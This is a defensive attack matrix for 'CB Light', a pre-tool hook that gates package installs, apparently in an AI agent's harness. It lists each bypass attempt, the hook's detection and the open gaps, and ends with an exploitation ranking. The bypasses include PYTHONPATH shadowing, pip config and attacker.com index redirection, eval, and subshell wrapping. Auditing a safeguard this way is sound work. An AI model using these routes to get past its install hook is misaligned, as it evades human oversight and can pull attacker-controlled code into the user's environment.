# CB Light Unpinned Install Attack Matrix

**Scope**: Read-only analysis of attack surfaces against CB Light constraint enforcement when installations occur outside the mandated interpreter check or hook visibility. This matrix catalogs what must be true for each attack to succeed and what detection paths remain.

**Assumption**: Owner account can write every local tree; hooks snapshot at session start; manifest detects kernel movement; SQLite receipts chain with sha256; GitHub required checks form outer boundary.

---

## 1. INTERPRETER BYPASS ATTACKS

### 1.1 Bare `pip` Instead of Mandated Interpreter

**Attack vector**: `pip install package` vs `/path/to/python3 -m pip install package`

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| `pip` in PATH resolves to an untracked venv or system Python | `cb_pretooluse_guard.sh` runs first; `_mutation_shape()` catches `bare-pip` tool and returns `MANDATED_INTERPRETER_REQUIRED` REFUSE | REFUSE on bare-pip detection |
| Attacker modifies alias: `alias pip=/usr/bin/pip3` | Hook runs before alias expansion; sees unresolved `pip` name in command string | REFUSE: `bare-pip` error on command text analysis |
| Attacker wraps pip in shell script: `~/bin/pip` → `exec /usr/bin/pip3 "$@"` | Hook inspects executable name from `shlex.split()`: `Path(tokens[0]).name` is `pip`, triggers `bare-pip` detection | REFUSE: tool detection fires before wrapper executes |
| Attacker runs from venv activate script first | Pre-hook does not validate PATH or shell state; if `pip` in PATH points to venv, bare-pip REFUSE fires | REFUSE: tool detection; **Risk**: subsequent activate-then-install not re-hooked if compound |

**Fail-closed matrix**:
- ✅ Refuse `bare-pip` commands (tool name is `pip` not full path)
- ⚠️ **Open**: `python -m pip install` with wrong Python path (checked only if `_same_executable()` path resolution succeeds; relative paths fail gracefully but are not caught)
- ⚠️ **Open**: Compound command: `source venv/bin/activate && pip install` (executed as single Bash string; only the `pip` part is parsed)

---

### 1.2 Python Module Invocation with Wrong Interpreter

**Attack vector**: `/usr/bin/python3 -m pip install package` (wrong interpreter)

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Command string contains `-m pip` but wrong `/usr/bin/python3` | `_mutation_shape()` detects `module_index`, checks tokens[0] (executable) with `_same_executable()` against `MANDATED_INTERPRETER` | REFUSE: `MANDATED_INTERPRETER_REQUIRED` |
| Attacker uses a symlink to the contained launcher | Declared-runtime checks normalize the literal path without dereferencing symlinks | REFUSE: the alias is not the exact contained environment path |
| Attacker uses `which python3` in command: `$(which python3) -m pip` | `_mutation_shape()` sees literal `$(which python3)` as token[0]; path resolution fails (contains `$`); `_resolved_executable()` returns None; comparison uses None == expected (False) | REFUSE: mismatch detected |
| Attacker uses absolute path to wrong interpreter with same name | Declared-path normalization preserves the environment path rather than its shared host-binary target | REFUSE: path mismatch |

**Fail-closed matrix**:
- ✅ Refuse Python-pip with non-mandated interpreter
- ✅ Refuse uv-pip without `--python <mandated>` flag
- ⚠️ **Open**: Attacker modifies `~/.bashrc` to prepend a different Python to PATH; if command is just `pip` (not full path), the venv Python wins; if command is `/usr/bin/python3`, it's caught—but if attacker can write `/Users/joshuaeisenhart/.local/share/codex-ratchet/envs/main/bin/python3`, that's a kernel-level compromise

---

### 1.3 `uv` with Incorrect `--python` Pinning

**Attack vector**: `uv pip install --python /wrong/python package` or omit `--python`

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| `uv pip install package` (no `--python`) | `_mutation_shape()` identifies `uv-pip` tool; `evaluate_install_command()` extracts `python_values` from `--python` flags; expects exactly 1 and it must match `MANDATED_INTERPRETER` | REFUSE: `UV_MANDATED_INTERPRETER_REQUIRED` |
| `uv pip install --python /usr/bin/python3 package` | Same extraction; `_same_executable()` compares `/usr/bin/python3` against mandated | REFUSE: mismatch |
| Attacker uses `--python=$(which python3)` | Argument parser sees literal string `--python=$(which python3)`; split on `=` gives `/wrong/path/python3`; path resolution fails or mismatch | REFUSE: resolution or mismatch |

**Fail-closed matrix**:
- ✅ Refuse uv-pip without `--python`
- ✅ Refuse uv-pip with wrong `--python`
- ✅ Refuse compound paths that fail to resolve
- ⚠️ **Open**: Attacker wraps uv in shell function: `uv() { /usr/bin/uv pip install --python /wrong/python "$@"; }` then calls `uv pip install --python /mandated package`. Function is evaluated at **hook invocation time** (pre-hook runs in shell that sources user's `.bashrc`), so the wrapped uv is not visible to the hook's `shlex.split()` — hook sees the literal `uv` command | **Risk**: shell function expansion pre-hook is a bypass channel

---

## 2. REQUIREMENT FILE AND PACKAGE SOURCE ATTACKS

### 2.1 Unbounded Requirement Files

**Attack vector**: `pip install -r /attacker/requirements.txt` or `--constraint` flag

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Command contains `-r`, `--requirement`, `-c`, or `--constraint` | `_unbounded_option_reason()` iterates over `_UNBOUNDED_OPTION_REASONS`; matches `-r` to `UNBOUNDED_REQUIREMENT_FILE` key | REFUSE: `UNBOUNDED_REQUIREMENT_FILE` |
| Attacker uses `-r=file.txt` | `_option_matches()` checks `token.startswith(option + "=")` for options like `-r` | REFUSE: matched |
| Attacker uses `--requirement file.txt` | Exact match in options set | REFUSE: matched |

**Fail-closed matrix**:
- ✅ Refuse `-r`, `--requirement`, `-c`, `--constraint`
- ✅ Refuse all forms (`-r`, `-r=`, `--requirement`)
- ⚠️ **Open**: Attacker uses space-separated form hidden in env var: `CMD="-r /attacker/req" pip install $CMD`. Hook sees `pip install $CMD` (unexpanded); `shlex.split()` does not expand `$CMD` | **Risk**: shell variable expansion is post-hook

---

### 2.2 Alternative Package Sources

**Attack vector**: `--index-url`, `--extra-index-url`, `--find-links` to pull from attacker-controlled index

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Command includes `--index-url https://attacker.com/pypi` | `_unbounded_option_reason()` matches to `UNBOUNDED_PACKAGE_SOURCE` | REFUSE: `UNBOUNDED_PACKAGE_SOURCE` |
| Attacker uses `--extra-index-url` | Exact match in options set | REFUSE: matched |
| Attacker uses `--find-links ./local` | Exact match; path is not validated, but option presence alone triggers REFUSE | REFUSE: option detected |

**Fail-closed matrix**:
- ✅ Refuse `--index-url`, `--extra-index-url`, `--find-links`
- ⚠️ **Open**: Attacker modifies `~/.pip/pip.conf` or `PIP_INDEX_URL` environment variable **before session start**. Hook does not inspect environment or pip config | **Risk**: pip reads config outside hook scope; session-start gate checks **domain state** not pip config

---

### 2.3 Direct URL Installs

**Attack vector**: `pip install git+https://attacker.com/repo.git` or `pip install /local/path/package`

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Command includes `git+https://...` URL | `_requested()` checks `if "://" in token or token.startswith(("git+", "hg+", ...))` | REFUSE: `DIRECT_URL_NOT_BOUNDED` |
| Attacker uses `--editable` (VCS install): `pip install -e git+https://...` | `_requested()` parses `-e` flag and captures project path; checks for URL patterns | REFUSE: `DIRECT_URL_NOT_BOUNDED` |
| Attacker uses local editable install: `pip install -e .` | `_requested()` recognizes `.`, `./`, `../` as project paths; `_project_is_constraint_box()` checks if path resolves to `ROOT` | REFUSE if not CB, ADMIT if CB only |

**Fail-closed matrix**:
- ✅ Refuse direct URLs (git+, http://, etc.)
- ✅ Refuse editable installs except CB itself
- ✅ Refuse mixed package + project installs
- ⚠️ **Open**: Attacker places malicious `setup.py` in CB repo, installs CB editable. Hook sees `pip install -e constraint_box` (allowed), but setup.py runs arbitrary code during install | **Risk**: setup.py execution during editable install is post-hook

---

## 3. TOOL WRAPPING AND INDIRECTION ATTACKS

### 3.1 Shell Wrapper Commands

**Attack vector**: `command pip install package`, `env PYTHONPATH=/attacker pip install`, `sudo pip install`

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Command is `command pip install package` | `_mutation_shape()` at depth 0 checks if `tokens[0]` (after stripping env prefix) is in `_MUTATION_WRAPPERS` | Detected but continues |
| `_strip_environment_prefix()` removes leading env vars and locates the real executable | `tokens[0]` is now `pip` (or the wrapped command); checked against `_MUTATION_WRAPPERS` (includes `command`) | Returns `{"mutation": True, "error": "INDIRECT_MUTATION_WRAPPER"}` |
| Attacker uses `nice -n 0 pip install` | `nice` is in `_MUTATION_WRAPPERS`; nested call recursively checks `pip install` up to depth 3 | REFUSE: `INDIRECT_MUTATION_WRAPPER` |
| Attacker nests: `bash -c "sudo pip install package"` | At depth 0, sees `bash -c` tokens; recursively calls `_mutation_shape("sudo pip install package", depth=1)` → detects `sudo`, recurses to `pip install`, detects mutation | REFUSE: nested mutation detected |
| Attacker nests beyond depth 3: `bash -c "bash -c "bash -c "bash -c "pip install...""""` | `depth > 3` returns early: `{"mutation": True, "error": "MUTATION_WRAPPER_DEPTH_EXCEEDED"}` | REFUSE: depth limit |

**Fail-closed matrix**:
- ✅ Refuse command, env, nice, sudo, timeout, xargs, nohup, etc.
- ✅ Refuse nested wrappers up to depth 3
- ✅ Refuse nesting beyond depth 3
- ⚠️ **Open**: Attacker uses shell builtin that is not a wrapper: `eval "pip install package"`. Hook sees `eval` command; `Path(tokens[0]).name.lower()` is `eval`; not in `_MUTATION_WRAPPERS` | **Risk**: eval and other shell builtins are not blocked

---

### 3.2 Shell Function and Alias Redirection

**Attack vector**: Alias or function that wraps the mandated interpreter

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| User defines `alias python3="/attacker/bin/python3.sh"` | Hook input is the raw command string **before** shell expansion (pre-hook runs via stdin before alias expansion) | Hook sees literal `/path/to/python3`; can resolve and compare |
| Shell function: `python3() { /attacker/python3 "$@"; }` | Hook sees `python3 -m pip install`; `_resolved_executable()` tries to resolve `python3` (no `/`); returns None; comparison fails | **Ambiguous**: `None == expected_path` (False), so REFUSE on mismatch |
| Attacker makes `python3` executable in `~/bin` and adds to PATH | Pre-hook runs in a shell that **sources user's bashrc** (depends on hook invocation context). If bashrc is sourced, aliases and functions are available; literal `python3` resolves via PATH to attacker's version | **Risk**: PATH resolution at hook time is user-controlled

**Fail-closed matrix**:
- ✅ Refuse relative `python3` if it resolves to wrong path
- ⚠️ **Open**: Hook's PATH is inherited from shell session; user can control PATH via `.bashrc` or `.zshrc`
- ⚠️ **Open**: Shell function expansion happens **before** hook sees the command string (depends on hook invocation mechanism)

---

## 4. INSTALL DESTINATION ATTACKS

### 4.1 Alternative Installation Prefix

**Attack vector**: `pip install --target /tmp/attack package`, `--prefix`, `--root`, `--user`

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Command includes `--target /tmp/malicious` | `_unbounded_option_reason()` matches to `INSTALL_DESTINATION_OUTSIDE_MANDATED_INTERPRETER` | REFUSE: `INSTALL_DESTINATION_OUTSIDE_MANDATED_INTERPRETER` |
| Attacker uses `--prefix`, `--root`, `--user` | Exact match in options set | REFUSE: matched |
| Attacker installs to user site-packages: `pip install --user package` | Matched | REFUSE: `INSTALL_DESTINATION_OUTSIDE_MANDATED_INTERPRETER` |

**Fail-closed matrix**:
- ✅ Refuse `--target`, `--prefix`, `--root`, `--user`
- ⚠️ **Open**: Attacker modifies `~/.pydistutils.cfg` or `pip.conf` to set default prefix **before** hook runs. pip reads config; hook does not inspect it | **Risk**: pip config files are outside hook scope

---

## 5. BUILD CONFIGURATION AND SETUP.PY ATTACKS

### 5.1 `--config-settings` and Custom Build Scripts

**Attack vector**: `pip install --config-settings="--global-option=--malicious" package`

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Command includes `--config-settings` | `_unbounded_option_reason()` matches to `UNBOUNDED_BUILD_CONFIGURATION` | REFUSE: `UNBOUNDED_BUILD_CONFIGURATION` |

**Fail-closed matrix**:
- ✅ Refuse `--config-settings`
- ⚠️ **Open**: Package's `setup.py` or `pyproject.toml` contains `build-backend` that runs arbitrary Python **during install, after hook validation**. Hook runs **before** pip executes build | **Risk**: build backend execution is post-hook; validation ends at install acceptance, not completion

---

## 6. PACKAGE SELECTION ATTACKS

### 6.1 Requesting Unselected or Outside-Domain Packages

**Attack vector**: `pip install not-in-cb-light package`

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Requested package is not in `domain["rows"]` | `evaluate_install_command()` computes `domain_names`, `direct`, `core_contract`, `installable_core` sets; checks if requested names are in domain | REFUSE: `PACKAGE_OUTSIDE_CB_LIGHT_PROPOSAL_DOMAIN` |
| Package is in domain but not marked `core_contract` | `unselected` set includes any package not in both `direct` (declared in pyproject) and `core_contract` (passed probe contracts) | REFUSE: `CANDIDATE_NOT_SELECTED_FOR_INSTALL` (HOLD, requires approval) |

**Fail-closed matrix**:
- ✅ Refuse packages outside domain
- ✅ Hold packages not selected for install (flagged for review)
- ⚠️ **Open**: Domain is computed at hook time from `pyproject.toml` and probe results. If domain file is stale or attacker modifies `pyproject.toml` **before** hook runs, domain is stale | **Risk**: domain freshness depends on session state; no real-time freshness check during pre-install hook

---

### 6.2 Version Constraint Bypass

**Attack vector**: `pip install package==1.0.0` when pyproject requires `package==2.0.0`

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Requested spec `package==1.0.0` is not in `allowed` set | `evaluate_install_command()` normalizes requested spec; checks if canonical form is in `allowed` | REFUSE: `DECLARED_VERSION_CONSTRAINT_REQUIRED` (HOLD) |
| `allowed` set includes declared requirement and current installed version | Covers both uninstall-then-install and upgrade scenarios | HOLD if version mismatch |

**Fail-closed matrix**:
- ✅ Hold version mismatches (pre-install gate)
- ⚠️ **Open**: Attacker requests version that is not already installed, not in declared set, but becomes "current" after install. Version validation is static (pre-install), not dynamic | **Risk**: version must be approved pre-install; no validation that installed version matches after hook completes

---

## 7. MUTATION SIGNATURE EVASION

### 7.1 Unparsed Package Mutation Commands

**Attack vector**: Non-standard syntax that evades `_mutation_shape()` detection

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Command has package mutation signature but is not recognized by `_mutation_shape()` | `_has_package_mutation_signature()` is the fallback: checks for `pip` + `install`/`uninstall`, `uv` + `add`/`remove`/`sync`, `poetry`/`conda`/`pipx` with mutation verbs | If recognized but not parsed: REFUSE `UNPARSED_PACKAGE_MUTATION` |
| Attacker uses non-ASCII or zero-width characters to hide mutation syntax | `_mutation_shape()` uses `shlex.split()` which respects POSIX shell quoting; non-ASCII survives | Hook parses command as-is; non-ASCII does not affect token detection |
| Attacker uses shell variable or command substitution in package name: `pip install $(echo malicious)` | `shlex.split()` does not expand variables; sees `$(echo malicious)` as literal token | `_requested()` tries to normalize this token as package name; fails parsing | REFUSE: `PACKAGE_SPEC_PARSE_FAILED` |

**Fail-closed matrix**:
- ✅ Refuse unparsed mutations with package signature
- ✅ Refuse spec parse failures
- ✅ Shell variables and command substitution are parsed as literals, not expanded
- ⚠️ **Open**: Attacker uses UTF-8 lookalike characters (e.g., Cyrillic 'а' vs Latin 'a') in package name to bypass domain check | **Risk**: PEP 503 normalization uses ASCII downcasing and `re.sub()` pattern; non-ASCII characters may not normalize as expected

---

## 8. COMPOUND COMMAND ATTACKS

### 8.1 Command Chaining and Control Tokens

**Attack vector**: `pip install safe-package && pip install malicious-package`

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Command contains `;`, `&&`, `||`, `|`, `&` between tokens | `_mutation_shape()` tries to `shlex.split()` the full command; if successful, checks if any token is in `_CONTROL_TOKENS` | If control token found: REFUSE `COMPOUND_MUTATION_COMMAND` |
| Attacker uses semicolon: `pip install safe; pip install malicious` | Token is `;` in split result; matches `_CONTROL_TOKENS` | REFUSE: `COMPOUND_MUTATION_COMMAND` |
| Attacker uses subshell: `(pip install malicious)` | `shlex.split()` preserves parens as tokens; `(` is not a control token but `pip install` inside is a mutation | `_has_package_mutation_signature()` detects it; mutation detected but not as compound | **Ambiguous**: subshell parens are not in `_CONTROL_TOKENS`, so they may not be blocked as control flow

**Fail-closed matrix**:
- ✅ Refuse commands with `;`, `&&`, `||`, `|`, `&`
- ⚠️ **Open**: Subshell `(cmd)` is not in control tokens; parens-wrapped pip install may evade the control-token check
- ⚠️ **Open**: Newline in multi-line shell command: `pip install \<newline>package` (shlex handles newline as whitespace, not control token)

---

## 9. STATE AND RECEIPT TAMPERING ATTACKS

### 9.1 SQLite Database Tampering

**Attack vector**: Attacker modifies CB Light state database to falsify receipt chain

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Attacker modifies `cb-light-v1.sqlite3` to insert false "ADMIT" receipts | `cb_light_state.py` uses `sqlite3.connect(..., timeout=10.0)` with `PRAGMA synchronous = FULL` and `PRAGMA journal_mode = WAL` | Database state is preserved; receipts reflect actual edits |
| Attacker tries to forge a receipt by inserting a row | Receipt validity depends on **sha256 of domain snapshot, probe results, and selections**. Each decision is linked to snapshot_id and probe_run_id | Forged receipt will have mismatched snapshot_id (stale); `task_completion_claimed` checks required facts against receipt chain |
| Attacker tries to replay an old receipt to clear a HOLD | `cb_light_gate.py` re-probes **every** `post-tool` and `session-start` call. Probe matrix is re-run; if the underlying issue (e.g., stale package) persists, the HOLD is re-asserted | Replay fails because probe re-runs |

**Fail-closed matrix**:
- ✅ SQLite writes are fsynced (`PRAGMA synchronous = FULL`)
- ✅ WAL mode prevents corruption on crash
- ✅ Receipt validity depends on snapshot and probe hashes, not modifiable post-insert
- ⚠️ **Open**: Attacker modifies domain snapshot or probe results **before** they are inserted into SQLite. If attacker can mutate the domain at runtime (e.g., replace `pyproject.toml` before gate.py reads it), the snapshot hash reflects the modified domain | **Risk**: domain source is on-disk; attacker with write access can mutate it

---

### 9.2 Manifest Tampering

**Attack vector**: Attacker modifies `manifest.json` in `hookkernel/` to disable checks

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| `manifest.json` is missing or has wrong file hashes | `_verify_manifest()` in `kernel.py` checks that each file in `manifest` has matching sha256 | Missing manifest → HOLD `HOOK_UNAVAILABLE` or `KERNEL_TAMPERED` |
| Attacker replaces `manifest.json` with a version that marks files as `REPLACED_AT_BUILD` | Manifest check: `if expected in ("", "REPLACED_AT_BUILD")` → skips hash check. So attacker can replace manifest and file together | **Risk**: manifest and files can be replaced together; verification is "current files match current manifest", not "files are signed by known-good manifest" |

**Fail-closed matrix**:
- ✅ Hold on missing or corrupted manifest
- ⚠️ **Open**: Attacker replaces manifest and kernel files together (both writable by owner). Manifest is a consistency check, not an integrity check (no external key binding)

---

### 9.3 Registry Tampering

**Attack vector**: Attacker modifies `registry.json` (event definitions) to accept unbounded mutations

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| `registry.json` is missing | `dispatch()` in `kernel.py` checks if `registry_path` exists; missing → HOLD `HOOK_UNAVAILABLE` | HOLD |
| Attacker modifies registry to add new event or change event constraints | Registry is loaded as JSON; its structure is not validated. Attacker can add events or change reason codes | **Risk**: registry defines the ground truth for allowed events; attacker with write access can redefine it |

**Fail-closed matrix**:
- ✅ Hold on missing registry
- ⚠️ **Open**: Registry is not signed or checksummed; attacker can modify it

---

## 10. INTERPRETER ENVIRONMENT ATTACKS

### 10.1 Python Path and Import Shadowing

**Attack vector**: Attacker sets `PYTHONPATH=/attacker:` to shadow `constraint_box` module

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Pre-hook sets `PYTHONPATH=/attacker` to load attacker's `constraint_box` module | Hook runs as: `python -m constraint_box.hookkernel.cb_light_gate ...` (using mandated interpreter) | Python searches `PYTHONPATH` first; attacker's module is imported |
| Attacker's fake `cb_light_gate.py` returns ADMIT for any mutation | Module loading and execution is post-hook invocation; if fake module is used, fake decision is returned | **Critical Risk**: constraint execution uses `sys.path`, which is modifiable; no integrity check on imported modules |

**Fail-closed matrix**:
- ✅ Use mandated interpreter (path-based)
- ⚠️ **Critical open**: Python import path is not restricted. `PYTHONPATH` env var can shadow modules
- ⚠️ **Critical open**: Mandated interpreter is a path, not a signed or measured binary

---

### 10.2 Virtualenv Activation

**Attack vector**: Attacker modifies `activate` script in the mandated interpreter's venv to patch `constraint_box`

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Attacker modifies `~/.local/share/codex-ratchet/envs/main/bin/activate` | Activate script is part of the venv; if attacker has write access to the venv, they can modify it | **Critical Risk**: mandated interpreter location is writable by owner; no integrity check |

**Fail-closed matrix**:
- ⚠️ **Critical open**: Mandated interpreter venv is in user home directory (writable by owner)
- ⚠️ **Critical open**: No integrity measurement of venv contents

---

## 11. HOOK INVOCATION AND PAYLOAD INJECTION ATTACKS

### 11.1 Malformed JSON Payload

**Attack vector**: Attacker sends invalid JSON to pre-install hook

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Payload is `{invalid json}` | `_load_payload()` in `cb_light_gate.py` calls `json.loads()`; invalid JSON raises `ValueError` | `evaluate_install_command()` is not reached; HOLD `HOOK_RESULT_INVALID` |
| Payload is valid JSON but not a dict (e.g., `[]` or `"string"`) | `_load_payload()` checks `if not isinstance(parsed, dict)` → raises `ValueError` | HOLD `HOOK_RESULT_INVALID` |

**Fail-closed matrix**:
- ✅ Refuse invalid JSON
- ✅ Refuse non-dict JSON objects

---

### 11.2 Missing or Conflicting Payload Fields

**Attack vector**: Attacker sends payload with missing or conflicting fields

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Payload lacks `command` and `tool_input` fields | `_command_from_payload()` checks both; if neither exists, returns `""` (empty string). `_mutation_shape("")` → `shlex.split("")` → `[]` → `{"mutation": False}` | Returns NOT_A_PACKAGE_MUTATION (ADMIT) |
| Attacker sends `command: ""` | Empty command → no mutation → ADMIT | **Risk**: empty command is interpreted as non-mutation, not as error |
| Payload has `tool_input: "not a dict"` | `_command_from_payload()` checks `isinstance(tool_input, Mapping)` before accessing; if not a Mapping, returns empty string | ADMIT (non-mutation) |

**Fail-closed matrix**:
- ✅ Refuse missing command fields (treat as non-mutation, allow)
- ⚠️ **Open**: Empty command is allowed (non-mutation); could be confused with hook bypass

---

### 11.3 Oversized Payload

**Attack vector**: Attacker sends huge JSON payload to cause parser to stall

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Payload is 1GB of JSON | `json.loads()` reads into memory; Python process may OOM | **Risk**: no payload size limit; DoS possible |

**Fail-closed matrix**:
- ⚠️ **Open**: No maximum payload size enforced

---

## 12. HOOK EXECUTION TIMING ATTACKS

### 12.1 Race Between Hook and Install

**Attack vector**: Attacker modifies filesystem between pre-install hook (ADMIT) and actual pip install

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Pre-install hook validates `pyproject.toml` and says ADMIT; attacker modifies `pyproject.toml` before pip runs; pip reads modified version | Hook decision is cached; no re-validation before pip.subprocess runs | Post-install hook runs `post-tool` which re-probes the domain | **Detection**: post-tool gate runs again; if domain has changed, new probe results reflect it; if issue persists, HOLD |
| Attacker installs to venv **without triggering hook** (e.g., runs pip in a subprocess without stdin pipe to hook) | Hook is a `PreToolUse` matcher on Bash commands; if pip is invoked directly (not via Bash), hook may not run | **Risk**: hook dependency on command invocation channel; direct Python API calls bypass hook |

**Fail-closed matrix**:
- ✅ Post-tool gate re-runs probe; detects stale domain
- ⚠️ **Open**: Pre-hook and install are not atomic; race window exists
- ⚠️ **Open**: Direct Python API invocation (`subprocess.run(['pip', ...])`) may bypass Bash hook

---

## 13. ENVIRONMENT-LEVEL ATTACKS

### 13.1 Pip Configuration Files

**Attack vector**: Attacker sets up `~/.pip/pip.conf` or `~/.pydistutils.cfg` to redirect package sources

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| `~/.pip/pip.conf` contains `[global] index-url = https://attacker.com/pypi` | pip reads this file before hook runs. Hook does not inspect pip config | **Risk**: pip config is read outside hook scope |
| Hook would catch `--index-url` flag if passed on command line, but config file is invisible to hook | Config-based source redirection is not caught by pre-install hook | **Risk**: session-start gate checks domain (installed packages) not pip config |

**Fail-closed matrix**:
- ✅ Pre-install hook catches CLI `--index-url` flags
- ⚠️ **Open**: Pip config files (`pip.conf`, `pyproject.toml` `[tool.pip]`, `setup.cfg`) are read by pip before hook sees the command
- ⚠️ **Open**: Session-start gate checks **actual installed packages** not pip config, so config-based attack is only visible **after** install completes

---

### 13.2 Environment Variables

**Attack vector**: Attacker sets `PIP_INDEX_URL` or `PYTHONPATH` before invoking a tool

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Pre-hook runs in shell environment with `export PYTHONPATH=/attacker` | Hook's Python process inherits `PYTHONPATH` from shell | **Critical Risk**: hook's own imports are subject to path manipulation |
| `PIP_INDEX_URL=https://attacker.com/pypi` is set in shell before tool invocation | pip reads this env var before running; hook does not inspect env | **Risk**: env-based source redirection is not caught |

**Fail-closed matrix**:
- ⚠️ **Critical open**: Hook's Python process inherits `PYTHONPATH` from invoking shell; no isolation
- ⚠️ **Open**: pip reads `PIP_*` and `PYPI_*` env vars; hook does not inspect them

---

## 14. CONSTRAINT BOX SOURCE MODIFICATION ATTACKS

### 14.1 Direct Mutation of CB Light Code

**Attack vector**: Attacker modifies `constraint_box/hookkernel/*.py` before hook loads

| What must be true | Detection coverage | Fail-closed state |
|---|---|---|
| Attacker modifies `cb_light_gate.py` to always return ADMIT | Manifest check in `kernel.py` detects file changes | `_verify_manifest()` computes sha256 of each file; mismatch triggers HOLD `KERNEL_TAMPERED` |
| Attacker replaces the manifest as well | Manifest is writable by owner; attacker can replace it along with the modified code | **Risk**: manifest and code can be replaced together |
| Attacker uses git to revert or update code in constraint_box | Git operations are post-hook (run as normal Bash commands). If CB Light code is tracked in git, attacker can `git checkout` to a modified version | **Risk**: CB Light source is mutable via normal git commands; no protection against git-based tampering |

**Fail-closed matrix**:
- ✅ Manifest detects file modification (SHA256 hash check)
- ⚠️ **Open**: Manifest and code can be replaced together by owner account
- ⚠️ **Open**: CB Light source in git can be modified and committed; no signature verification on git commits

---

## 15. SUMMARY: FAIL-CLOSED GUARANTEE BOUNDARY

**Protected**:
1. ✅ Bare `pip` instead of mandated interpreter
2. ✅ Wrong Python version with `-m pip`
3. ✅ Missing or wrong `--python` for `uv pip`
4. ✅ Unbounded `-r`, `-c`, `--index-url`, `--find-links`, `--target`, `--prefix`, `--root`, `--user`
5. ✅ Direct URL installs (git+, http://)
6. ✅ Shell wrappers (command, sudo, env, etc.) up to depth 3
7. ✅ Compound commands with control tokens (`;`, `&&`, etc.)
8. ✅ Packages outside CB Light domain
9. ✅ Version constraint mismatches
10. ✅ Invalid JSON payloads
11. ✅ Missing manifests or kernel tampering (detected but not prevented)

**Critical Gaps**:
1. ⚠️ Shell function/alias expansion happens **before** hook if sourced via bashrc during hook invocation
2. ⚠️ Shell variable and command substitution (`$CMD`, `$(echo ...)`) are not expanded; parsed as literals (safe by accident)
3. ⚠️ Pip config files (`pip.conf`, `pyproject.toml`, `setup.cfg`, env vars) are read by pip **before** hook and are not inspected
4. ⚠️ `setup.py` and build backend execution happens **after** pre-install hook validation
5. ⚠️ Mandated interpreter venv and CB Light source code are in writable home directory; no integrity measurement without manifest signing
6. ⚠️ `PYTHONPATH` environment variable can shadow CB Light modules during hook execution (hook runs in shell environment)
7. ⚠️ Domain freshness at pre-install time depends on prior session state; no real-time freshness check
8. ⚠️ Subshell `(cmd)` parens are not in control tokens; subshell-wrapped pip installs may evade compound-command check
9. ⚠️ Direct Python API invocation (not via Bash CLI) may bypass Bash hook entirely
10. ⚠️ No payload size limit; oversized JSON could cause DoS

**Outer Boundary**: GitHub required checks on CI/CD pipeline (prevents pre-built, unsigned merges).

---

## 16. EXPLOITATION PRIORITIZATION

**Tier 1 - Immediate High Confidence**:
- Shell function or alias wrapping the mandated interpreter, sourced via bashrc at hook invocation time
- Pip config file redirection (`~/.pip/pip.conf` with `index-url`)
- `PYTHONPATH` environment variable set before hook to shadow `constraint_box` module

**Tier 2 - Moderate Confidence**:
- Direct modification of constraint_box source and manifest together (owner-level access)
- Setup.py or build backend code injection in a CBLight candidate package
- Git-based replacement of CB Light source code (post-commit hook could validate, but not at hook invocation time)

**Tier 3 - Complex / Lower Confidence**:
- Subshell parens to wrap pip install and evade control-token detection
- Domain staleness race: modify pyproject between pre-install and actual pip run
- Oversized payload DoS (unlikely to be exploitable for constraint bypass)

---
